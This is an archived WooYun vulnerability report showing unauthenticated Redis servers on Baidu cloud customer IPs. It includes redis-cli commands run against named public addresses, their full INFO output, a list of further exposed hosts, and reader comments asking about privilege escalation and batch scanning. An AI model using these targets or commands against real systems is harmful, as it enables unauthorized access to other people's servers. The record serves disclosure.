{"id": 87211, "wybug_id": "wooyun-2016-0195847", "wybug_title": "百度多台Redis服务器未授权访问", "wybug_corp": "百度", "wybug_author": "路人甲", "wybug_date": "2016-04-13 16:34", "wybug_open_date": "2016-05-28 19:20", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-28：\t细节向公众公开  简要描述： 百度多台服务器漏洞 详细说明：  redis未授权访问：IP:180.76.140.233\n\n\n\n\nroot@kali:~/.ssh# redis-cli -h 180.76.140.233 -p 6379180.76.140.233:6379> info# Serverredis_version:2.8.4redis_git_sha1:00000000redis_git_dirty:0redis_build_id:a44a05d76f06a5d9redis_mode:standaloneos:Linux 3.13.0-32-generic x86_64arch_bits:64multiplexing_api:epollgcc_version:4.8.2process_id:24318run_id:8fe479471888bb4edc00af947ca7aea4e2541274tcp_port:6379uptime_in_seconds:6657827uptime_in_days:77hz:10lru_clock:1349883config_file:# Clientsconnected_clients:3client_longest_output_list:0client_biggest_input_buf:44blocked_clients:1# Memoryused_memory:544768used_memory_human:532.00Kused_memory_rss:1638400used_memory_peak:1237600used_memory_peak_human:1.18Mused_memory_lua:38912mem_fragmentation_ratio:3.01mem_allocator:jemalloc-3.4.1# Persistenceloading:0rdb_changes_since_last_save:10478rdb_bgsave_in_progress:0rdb_last_save_time:1454398032rdb_last_bgsave_status:errrdb_last_bgsave_time_sec:0rdb_current_bgsave_time_sec:-1aof_enabled:0aof_rewrite_in_progress:0aof_rewrite_scheduled:0aof_last_rewrite_time_sec:-1aof_current_rewrite_time_sec:-1aof_last_bgrewrite_status:ok# Statstotal_connections_received:2166total_commands_processed:38777instantaneous_ops_per_sec:0rejected_connections:0sync_full:0sync_partial_ok:0sync_partial_err:0expired_keys:1evicted_keys:0keyspace_hits:12138keyspace_misses:7057pubsub_channels:0pubsub_patterns:0latest_fork_usec:196# Replicationrole:masterconnected_slaves:0master_repl_offset:0repl_backlog_active:0repl_backlog_size:1048576repl_backlog_first_byte_offset:0repl_backlog_histlen:0# CPUused_cpu_sys:1419.20used_cpu_user:1636.42used_cpu_sys_children:292.56used_cpu_user_children:166.27# Keyspacedb0:keys=1,expires=0,avg_ttl=0\nIP:182.61.9.225\nroot@kali:~/.ssh# redis-cli -h 182.61.9.225 -p 6379182.61.9.225:6379> info# Serverredis_version:3.0.5redis_git_sha1:00000000redis_git_dirty:0redis_build_id:a46578aeaeed0f67redis_mode:standaloneos:Linux 2.6.32-431.el6.x86_64 x86_64arch_bits:64multiplexing_api:epollgcc_version:4.4.7process_id:22404run_id:3e7fda016038c7bc6fb37480fb4bcb4199f909f3tcp_port:6379uptime_in_seconds:1786283uptime_in_days:20hz:10lru_clock:916177config_file:/etc/redis.conf# Clientsconnected_clients:2client_longest_output_list:0client_biggest_input_buf:0blocked_clients:0# Memoryused_memory:901120used_memory_human:880.00Kused_memory_rss:2678784used_memory_peak:949112used_memory_peak_human:926.87Kused_memory_lua:36864mem_fragmentation_ratio:2.97mem_allocator:libc# Persistenceloading:0rdb_changes_since_last_save:0rdb_bgsave_in_progress:0rdb_last_save_time:1460525179rdb_last_bgsave_status:okrdb_last_bgsave_time_sec:0rdb_current_bgsave_time_sec:-1aof_enabled:0aof_rewrite_in_progress:0aof_rewrite_scheduled:0aof_last_rewrite_time_sec:-1aof_current_rewrite_time_sec:-1aof_last_bgrewrite_status:okaof_last_write_status:ok# Statstotal_connections_received:7213total_commands_processed:7534instantaneous_ops_per_sec:0total_net_input_bytes:398687total_net_output_bytes:126621instantaneous_input_kbps:0.00instantaneous_output_kbps:0.00rejected_connections:0sync_full:0sync_partial_ok:0sync_partial_err:0expired_keys:43evicted_keys:0keyspace_hits:633keyspace_misses:3pubsub_channels:0pubsub_patterns:0latest_fork_usec:215migrate_cached_sockets:0# Replicationrole:masterconnected_slaves:0master_repl_offset:0repl_backlog_active:0repl_backlog_size:1048576repl_backlog_first_byte_offset:0repl_backlog_histlen:0# CPUused_cpu_sys:507.02used_cpu_user:330.11used_cpu_sys_children:0.09used_cpu_user_children:0.00# Clustercluster_enabled:0# Keyspacedb0:keys=4,expires=0,avg_ttl=0\nIP:180.76.149.53\nroot@kali:~/.ssh# redis-cli -h 180.76.149.53 -p 6379180.76.149.53:6379> info# Serverredis_version:3.0.6redis_git_sha1:00000000redis_git_dirty:0redis_build_id:5c7eaa2e19cb5102redis_mode:standaloneos:Linux 2.6.32-431.el6.x86_64 x86_64arch_bits:64multiplexing_api:epollgcc_version:4.4.7process_id:1732run_id:beb0c8ab0beb39c0e67978f94e8d52b5d6b80fc0tcp_port:6379uptime_in_seconds:6734471uptime_in_days:77hz:10lru_clock:916289config_file:/home/wwwroot/www.shell.com/redis-3.0.6/redis.conf# Clientsconnected_clients:3client_longest_output_list:0client_biggest_input_buf:0blocked_clients:0# Memoryused_memory:917904used_memory_human:896.39Kused_memory_rss:2617344used_memory_peak:949696used_memory_peak_human:927.44Kused_memory_lua:36864mem_fragmentation_ratio:2.85mem_allocator:libc# Persistenceloading:0rdb_changes_since_last_save:0rdb_bgsave_in_progress:0rdb_last_save_time:1460470546rdb_last_bgsave_status:okrdb_last_bgsave_time_sec:0rdb_current_bgsave_time_sec:-1aof_enabled:1aof_rewrite_in_progress:0aof_rewrite_scheduled:0aof_last_rewrite_time_sec:-1aof_current_rewrite_time_sec:-1aof_last_bgrewrite_status:okaof_last_write_status:okaof_current_size:70952aof_base_size:0aof_pending_rewrite:0aof_buffer_length:0aof_rewrite_buffer_length:0aof_pending_bio_fsync:0aof_delayed_fsync:0# Statstotal_connections_received:910total_commands_processed:1109instantaneous_ops_per_sec:0total_net_input_bytes:101816total_net_output_bytes:214890instantaneous_input_kbps:0.00instantaneous_output_kbps:0.00rejected_connections:0sync_full:0sync_partial_ok:0sync_partial_err:0expired_keys:0evicted_keys:0keyspace_hits:14keyspace_misses:0pubsub_channels:0pubsub_patterns:0latest_fork_usec:384migrate_cached_sockets:0# Replicationrole:masterconnected_slaves:0master_repl_offset:0repl_backlog_active:0repl_backlog_size:1048576repl_backlog_first_byte_offset:0repl_backlog_histlen:0# CPUused_cpu_sys:5805.96used_cpu_user:2799.02used_cpu_sys_children:0.14used_cpu_user_children:0.05# Clustercluster_enabled:0# Keyspacedb0:keys=1,expires=0,avg_ttl=0\nip:180.76.150.114\nroot@kali:~/.ssh# redis-cli -h 180.76.150.114 -p 6379180.76.150.114:6379> info# Serverredis_version:2.8.19redis_git_sha1:00000000redis_git_dirty:0redis_build_id:edaf234646095212redis_mode:standaloneos:Linux 2.6.32-431.el6.x86_64 x86_64arch_bits:64multiplexing_api:epollgcc_version:4.4.7process_id:25344run_id:67e5ec4c3834b9726edffc0ee3fb92b8ebc7ca51tcp_port:6379uptime_in_seconds:14007210uptime_in_days:162hz:10lru_clock:916339config_file:/etc/redis.conf# Clientsconnected_clients:43client_longest_output_list:0client_biggest_input_buf:0blocked_clients:0# Memoryused_memory:1878720used_memory_human:1.79Mused_memory_rss:7864320used_memory_peak:7404136used_memory_peak_human:7.06Mused_memory_lua:35840mem_fragmentation_ratio:4.19mem_allocator:jemalloc-3.6.0# Persistenceloading:0rdb_changes_since_last_save:0rdb_bgsave_in_progress:0rdb_last_save_time:1460364014rdb_last_bgsave_status:okrdb_last_bgsave_time_sec:0rdb_current_bgsave_time_sec:-1aof_enabled:0aof_rewrite_in_progress:0aof_rewrite_scheduled:0aof_last_rewrite_time_sec:-1aof_current_rewrite_time_sec:-1aof_last_bgrewrite_status:okaof_last_write_status:ok# Statstotal_connections_received:459173997total_commands_processed:873581211instantaneous_ops_per_sec:46total_net_input_bytes:31283716245total_net_output_bytes:567422830645instantaneous_input_kbps:1.18instantaneous_output_kbps:18.84rejected_connections:0sync_full:0sync_partial_ok:0sync_partial_err:0expired_keys:0evicted_keys:0keyspace_hits:2112479520keyspace_misses:17pubsub_channels:0pubsub_patterns:0latest_fork_usec:340# Replicationrole:slavemaster_host:121.40.56.18master_port:6379master_link_status:upmaster_last_io_seconds_ago:1master_sync_in_progress:0slave_repl_offset:11671009slave_priority:100slave_read_only:1connected_slaves:0master_repl_offset:0repl_backlog_active:0repl_backlog_size:1048576repl_backlog_first_byte_offset:0repl_backlog_histlen:0# CPUused_cpu_sys:89698.45used_cpu_user:38758.61used_cpu_sys_children:2.06used_cpu_user_children:0.68# Keyspacedb0:keys=440,expires=0,avg_ttl=0\nip:180.76.147.42\nroot@kali:~/.ssh# redis-cli -h 180.76.147.42 -p 6379180.76.147.42:6379> info# Serverredis_version:2.5.14redis_git_sha1:21645232redis_git_dirty:0redis_mode:standaloneos:Linux 3.11.0-15-generic x86_64arch_bits:64multiplexing_api:epollgcc_version:4.6.3process_id:13481run_id:52eb35d50863a823ec6fbccbc7faae2a3e5b8e61tcp_port:6379uptime_in_seconds:3129468uptime_in_days:36lru_clock:1349929# Clientsconnected_clients:2client_longest_output_list:0client_biggest_input_buf:0blocked_clients:0# Memoryused_memory:564560used_memory_human:551.33Kused_memory_rss:2146304used_memory_peak:645216used_memory_peak_human:630.09Kused_memory_lua:31744mem_fragmentation_ratio:3.80mem_allocator:jemalloc-3.0.0# Persistenceloading:0rdb_changes_since_last_save:85rdb_bgsave_in_progress:0rdb_last_save_time:1460534001rdb_last_bgsave_status:okrdb_last_bgsave_time_sec:0rdb_current_bgsave_time_sec:-1aof_enabled:1aof_rewrite_in_progress:0aof_rewrite_scheduled:0aof_last_rewrite_time_sec:-1aof_current_rewrite_time_sec:-1aof_last_bgrewrite_status:okaof_current_size:27831065aof_base_size:0aof_pending_rewrite:0aof_buffer_length:0aof_rewrite_buffer_length:0aof_pending_bio_fsync:0aof_delayed_fsync:0# Statstotal_connections_received:2146total_commands_processed:342802instantaneous_ops_per_sec:0rejected_connections:0expired_keys:0evicted_keys:0keyspace_hits:992383keyspace_misses:194pubsub_channels:0pubsub_patterns:0latest_fork_usec:265# Replicationrole:masterconnected_slaves:0# CPUused_cpu_sys:4661.32used_cpu_user:2119.40used_cpu_sys_children:1.70used_cpu_user_children:0.11# Keyspacedb0:keys=6,expires=0\n180.76.145.62182.61.29.196180.76.128.189180.76.190.64182.61.11.94180.76.157.68180.76.189.225180.76.149.110180.76.173.112182.61.2.64182.61.25.194180.76.150.168180.76.137.209180.76.161.242\n\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2016-04-13 19:15 厂商回复： 感谢提交，这些IP皆为百度开放云上的客户服务，我们已紧急多次联系客户修复漏洞，客户正在修复中。为了保护我们的客户，我们确认漏洞，避免忽略漏洞造成的客户损失。非常感谢您的提交 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-04-13 17:31 |    \t\t坏男孩-A_A \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:23        | 膜拜学习中)\t\t \n  ...可以内网游了吧    \n     2016-04-13 17:40 |    \t\tsysALong \t\t\t( 普通白帽子  |\t\t\t        Rank:360 漏洞数:73        | 在我们黑龙江这噶哒，就没有什么事是【撸串...)\t\t \n  有路徑提權嗎？ssh呢？    \n     2016-04-23 23:06 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1371 漏洞数:151        | 乌云核心菜鸟，此号处于联盟托管中....)\t\t \n  洞主是怎么检测出弱口令，有没有批量的工具啊    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}